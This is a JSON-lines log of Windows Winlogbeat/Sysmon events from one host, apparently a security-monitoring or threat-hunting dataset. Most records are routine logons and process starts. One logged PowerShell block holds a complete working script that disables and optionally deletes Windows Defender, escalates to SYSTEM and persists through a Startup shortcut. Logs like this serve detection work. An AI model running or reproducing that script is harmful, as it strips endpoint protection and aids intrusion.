{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:41","winlog.event_data.CommandLine":"C:\\Windows\\servicing\\TrustedInstaller.exe","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\servicing\\TrustedInstaller.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:42","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:42","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:44","winlog.event_data.CommandLine":"C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.1732_none_16cfd51b2a4c336a\\TiWorker.exe -Embedding","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:44","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.1732_none_16cfd51b2a4c336a\\TiWorker.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:47","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:47","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:47","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:47","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:47","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:47","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:48","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:48","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:49","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:49","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"# Disable Windows Defender\n\n<#\nOptions :\n\n-Delete : delete the defender related files (services, drivers, executables, ....) \n\nSource :  https://bidouillesecurity.com/disable-windows-defender-in-powershell\n\n#>\n\nWrite-Host \"[+] Disable Windows Defender (as $(whoami))\"\n\n\n## STEP 0 : elevate if needed\n\n\nif(-Not $($(whoami) -eq \"nt authority\\system\")) {\n    $IsSystem = $false\n\n    # Elevate to admin (needed when called after reboot)\n    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {\n        Write-Host \"    [i] Elevate to Administrator\"\n        $CommandLine = \"-ExecutionPolicy Bypass `\"\" + $MyInvocation.MyCommand.Path + \"`\" \" + $MyInvocation.UnboundArguments\n        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine\n        Exit\n    }\n\n    # Elevate to SYSTEM if psexec is available\n    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source \n    if($psexec_path) {\n        Write-Host \"    [i] Elevate to SYSTEM\"\n        $CommandLine = \" -i -s powershell.exe -ExecutionPolicy Bypass `\"\" + $MyInvocation.MyCommand.Path + \"`\" \" + $MyInvocation.UnboundArguments \n        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine\n        exit\n    } else {\n        Write-Host \"    [i] PsExec not found, will continue as Administrator\"\n    }\n\n} else {\n    $IsSystem = $true\n}\n\n\n## STEP 1 : Disable everything we can with immediate effect\n\n\nWrite-Host \"    [+] Add exclusions\"\n\n# Add the whole system in Defender exclusions\n\n67..90|foreach-object{\n    $drive = [char]$_\n    Add-MpPreference -ExclusionPath \"$($drive):\\\" -ErrorAction SilentlyContinue\n    Add-MpPreference -ExclusionProcess \"$($drive):\\*\" -ErrorAction SilentlyContinue\n}\n\nWrite-Host \"    [+] Disable scanning engines (Set-MpPreference)\"\n\nSet-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue\n\nWrite-Host \"    [+] Set default actions to Allow (Set-MpPreference)\"\n\nSet-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue\nSet-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue\nSet-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue\n\n\n## STEP 2 : Disable services, we cannot stop them, but we can disable them (they won't start next reboot)\n\n\nWrite-Host \"    [+] Disable services\"\n\n$need_reboot = $false\n\n# WdNisSvc Network Inspection Service \n# WinDefend Antivirus Service\n# Sense : Advanced Protection Service\n\n$svc_list = @(\"WdNisSvc\", \"WinDefend\", \"Sense\")\nforeach($svc in $svc_list) {\n    if($(Test-Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\")) {\n        if( $(Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\").Start -eq 4) {\n            Write-Host \"        [i] Service $svc already disabled\"\n        } else {\n            Write-Host \"        [i] Disable service $svc (next reboot)\"\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\" -Name Start -Value 4\n            $need_reboot = $true\n        }\n    } else {\n        Write-Host \"        [i] Service $svc already deleted\"\n    }\n}\n\nWrite-Host \"    [+] Disable drivers\"\n\n# WdnisDrv : Network Inspection System Driver\n# wdfilter : Mini-Filter Driver\n# wdboot : Boot Driver\n\n$drv_list = @(\"WdnisDrv\", \"wdfilter\", \"wdboot\")\nforeach($drv in $drv_list) {\n    if($(Test-Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\")) {\n        if( $(Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\").Start -eq 4) {\n            Write-Host \"        [i] Driver $drv already disabled\"\n        } else {\n            Write-Host \"        [i] Disable driver $drv (next reboot)\"\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\" -Name Start -Value 4\n            $need_reboot = $true\n        }\n    } else {\n        Write-Host \"        [i] Driver $drv already deleted\"\n    }\n}\n\n# Check if service running or not\nif($(GET-Service -Name WinDefend).Status -eq \"Running\") {   \n    Write-Host \"    [+] WinDefend Service still running (reboot required)\"\n    $need_reboot = $true\n} else {\n    Write-Host \"    [+] WinDefend Service not running\"\n}\n\n\n## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)\n\n\n$link_reboot = \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\disable-defender.lnk\"\nRemove-Item -Force \"$link_reboot\" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)\n\nif($need_reboot) {\n    Write-Host \"    [+] This script will be started again after reboot.\" -BackgroundColor DarkRed -ForegroundColor White\n    \n    $powershell_path = '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"'\n    $cmdargs = \"-ExecutionPolicy Bypass `\"\" + $MyInvocation.MyCommand.Path + \"`\" \" + $MyInvocation.UnboundArguments\n    \n    $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force\n    $WshShell = New-Object -comObject WScript.Shell\n    $shortcut = $WshShell.CreateShortcut($link_reboot)\n    $shortcut.TargetPath = $powershell_path\n    $shortcut.Arguments = $cmdargs\n    $shortcut.WorkingDirectory = \"$(Split-Path -Path $PSScriptRoot -Parent)\"\n    $shortcut.Save()\n\n} else {\n\n\n    ## STEP 4 : After reboot (we checked that everything was successfully disabled), make sure it doesn't come up again !\n\n\n    if($IsSystem) {\n\n        # Configure the Defender registry to disable it (and the TamperProtection)\n        # editing HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\ requires to be SYSTEM\n\n        Write-Host \"    [+] Disable all functionnalities with registry keys (SYSTEM privilege)\"\n\n        # Cloud-delivered protection:\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name SpyNetReporting -Value 0\n        # Automatic Sample submission\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name SubmitSamplesConsent -Value 0\n        # Tamper protection\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name TamperProtection -Value 4\n        \n        # Disable in registry\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n\n    } else {\n        Write-Host \"    [W] (Optional) Cannot configure registry (not SYSTEM)\"\n    }\n\n\n    if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains(\"-delete\"))) {\n        \n        # Delete Defender files\n\n        function Delete-Show-Error {\n            $path_exists = Test-Path $args[0]\n            if($path_exists) {\n                Remove-Item -Recurse -Force -Path $args[0]\n            } else {\n                Write-Host \"    [i] $($args[0]) already deleted\"\n            }\n        }\n\n        Write-Host \"\"\n        Write-Host \"[+] Delete Windows Defender (files, services, drivers)\"\n\n        # Delete files\n        Delete-Show-Error \"C:\\ProgramData\\Windows\\Windows Defender\\\"\n        Delete-Show-Error \"C:\\ProgramData\\Windows\\Windows Defender Advanced Threat Protection\\\"\n\n        # Delete drivers\n        Delete-Show-Error \"C:\\Windows\\System32\\drivers\\wd\\\"\n\n        # Delete service registry entries\n        foreach($svc in $svc_list) {\n            Delete-Show-Error \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\"\n        }\n\n        # Delete drivers registry entries\n        foreach($drv in $drv_list) {\n            Delete-Show-Error \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\"\n        }\n    }\n}\n\nWrite-Host \"\"\nRead-Host -Prompt \"Press any key to continue\""}
{"timestamp":"2021-09-15T16:34:49","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:49","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:49","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\whoami.exe\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:49","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\whoami.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:50","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:50","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:50","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\whoami.exe\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:50","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\whoami.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:51","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:51","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:51","winlog.event_data.CommandLine":"consent.exe 5876 524 000001AF61022220","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Appinfo","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:51","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\consent.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:55","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:55","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:55","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:55","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass \"\"  ","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
